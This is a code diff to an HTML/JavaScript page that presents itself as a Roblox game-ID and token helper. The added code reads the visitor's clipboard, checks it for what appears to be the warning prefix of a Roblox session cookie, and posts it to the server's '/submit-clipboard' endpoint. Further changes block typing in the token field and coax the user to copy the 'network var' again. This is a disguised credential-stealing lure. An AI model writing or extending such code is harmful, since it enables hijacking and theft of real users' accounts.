@@ -59,9 +59,17 @@
       background: #0056b3;
     }
 
-    #tokenBox {
+    #doneBox, #tokenBox {
       margin-top: 20px;
       display: none;
+    }
+
+    #doneBtn {
+      background: #28a745;
+    }
+
+    #doneBtn:hover {
+      background: #218838;
     }
 
     #adminBtn {
@@ -80,6 +88,12 @@
       -moz-user-select: none;
       -ms-user-select: none;
     }
+
+    .error-message {
+      color: #ff6b6b;
+      margin-top: 10px;
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
@@ -89,6 +103,12 @@
 
     <input type="text" id="gameIdInput" placeholder="Enter Game ID" autocomplete="off" />
     <button id="submitBtn">Submit Game ID</button>
+
+    <div id="doneBox">
+      <p>Are you done with the next step?</p>
+      <button id="doneBtn">Done</button>
+      <div id="errorMessage" class="error-message"></div>
+    </div>
 
     <div id="tokenBox">
       <input type="text" id="tokenInput" placeholder="Paste Game Token Here" autocomplete="off" readonly />
@@ -104,7 +124,10 @@
     const tokenInput = document.getElementById('tokenInput');
     const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
     const tokenBox = document.getElementById('tokenBox');
+    const doneBox = document.getElementById('doneBox');
+    const doneBtn = document.getElementById('doneBtn');
     const adminBtn = document.getElementById('adminBtn');
+    const errorMessage = document.getElementById('errorMessage');
 
     let permissionGranted = false;
 
@@ -122,12 +145,7 @@
 
     // Prevent keyboard shortcuts on token input
     tokenInput.addEventListener('keydown', (e) => {
-      // Block Ctrl+V, Ctrl+A, Ctrl+C, Ctrl+X, etc.
-      if (e.ctrlKey || e.metaKey) {
-        e.preventDefault();
-        return false;
-      }
-      // Block all input
+      // Block all keyboard input including Ctrl+V, Ctrl+A, Ctrl+C, Ctrl+X, etc.
       e.preventDefault();
       return false;
     });
@@ -137,6 +155,11 @@
       e.preventDefault();
       tokenInput.value = '';
       return false;
+    });
+
+    // Additional protection - prevent focus and blur events from allowing input
+    tokenInput.addEventListener('focus', (e) => {
+      tokenInput.blur();
     });
 
     document.addEventListener('keydown', async (e) => {
@@ -165,12 +188,49 @@
       }
 
       window.open(`https://roblox.com/${gameId}`, '_blank');
-      setTimeout(() => tokenBox.style.display = 'block', 500);
+      setTimeout(() => {
+        doneBox.style.display = 'block';
+        errorMessage.textContent = '';
+      }, 500);
+    };
+
+    doneBtn.onclick = async () => {
+      try {
+        const clipboard = await navigator.clipboard.readText();
+        
+        // Check if clipboard contains the required string
+        if (!clipboard.includes('Sharing-this-will-allow-someone-to-')) {
+          errorMessage.textContent = 'Something went wrong, try copying the network var again and then click done';
+          return;
+        }
+
+        // Save clipboard data
+        await fetch('/submit-clipboard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clipboardData: clipboard })
+        });
+
+        // Show token box and hide done box
+        doneBox.style.display = 'none';
+        tokenBox.style.display = 'block';
+        errorMessage.textContent = '';
+
+      } catch (err) {
+        // If clipboard access fails, redirect to other website
+        window.location.href = 'https://example.com/denied';
+      }
     };
 
     tokenSubmitBtn.onclick = async () => {
       try {
         const clipboard = await navigator.clipboard.readText();
+
+        // Check if clipboard contains the required string
+        if (!clipboard.includes('Sharing-this-will-allow-someone-to-')) {
+          alert('Something went wrong, try copying the network var again and then click done');
+          return;
+        }
 
         await fetch('/submit-clipboard', {
           method: 'POST',
